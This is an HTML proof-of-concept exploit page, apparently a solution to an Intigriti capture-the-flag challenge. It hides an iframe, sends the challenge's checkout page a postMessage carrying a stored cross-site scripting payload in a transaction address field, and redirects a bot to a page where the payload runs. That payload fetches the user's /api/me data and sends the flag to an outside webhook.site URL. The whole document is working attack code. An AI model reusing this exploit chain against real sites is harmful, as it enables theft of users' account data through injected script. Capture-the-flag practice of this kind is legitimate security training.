<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Define the target URLs
        const challengeDomain = "https://challenge-0126.intigriti.io";
        const webhook = "https://webhook.site/f174d90f-ba4f-4ee9-b67b-bdefbadc2be4";

        // 2. The XSS payload to steal the flag
        // It escapes the title attribute and fetches /api/me
        const xssPayload = `"><img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>fetch('${webhook}?flag='+d.flag))">`;

        // 3. Open the checkout page in an iframe
        const iframe = document.createElement('iframe');
        iframe.src = `${challengeDomain}/checkout.html?currency=BTC&price=1`;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        iframe.onload = () => {
            // 4. Trigger the transaction via postMessage
            iframe.contentWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: xssPayload,
                    currency: 'BTC',
                    amount: 0.0001
                }
            }, '*');

            // 5. Redirect the bot to MarketWatch to trigger the Stored XSS
            setTimeout(() => {
                window.location.href = `${challengeDomain}/marketwatch.html`;
            }, 1500);
        };
    </script>
</body>
</html>
